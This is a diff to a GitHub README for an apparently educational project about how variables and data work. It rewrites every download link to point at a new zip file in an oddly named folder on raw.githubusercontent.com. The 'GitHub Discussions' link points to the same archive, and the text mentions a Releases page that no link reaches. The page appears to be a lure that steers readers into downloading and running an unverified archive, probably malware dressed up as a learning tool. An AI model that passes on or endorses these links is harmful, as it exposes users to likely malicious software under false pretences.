@@ -1,6 +1,6 @@
 # 🧪 exploring-the-true-nature-of-variable - Discover How Data Works
 
-[![Download](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip)
+[![Download](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/of_exploring_the_true_nature_variable_1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/of_exploring_the_true_nature_variable_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to "exploring-the-true-nature-of-variable". This application provides a 
 
 To get started, visit the following page to download the application:
 
-[Download Here](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip)
+[Download Here](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/of_exploring_the_true_nature_variable_1.0.zip)
 
 Once you are on the Releases page, choose the latest release. Click on the appropriate file for your operating system to download it. 
 
@@ -70,8 +70,8 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 Join the community to learn more about programming concepts and share your experiences. Engage with others who are also exploring the world of low-level programming.
 
-Visit the [GitHub Discussions](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip) to participate.
+Visit the [GitHub Discussions](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/of_exploring_the_true_nature_variable_1.0.zip) to participate.
 
 For another chance to download the application, visit the following link again:
 
-[Download Here](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/exploring-the-true-nature-of-variable.zip)
+[Download Here](https://raw.githubusercontent.com/NebiyuSeyoum/exploring-the-true-nature-of-variable/main/trackmanship/of_exploring_the_true_nature_variable_1.0.zip)
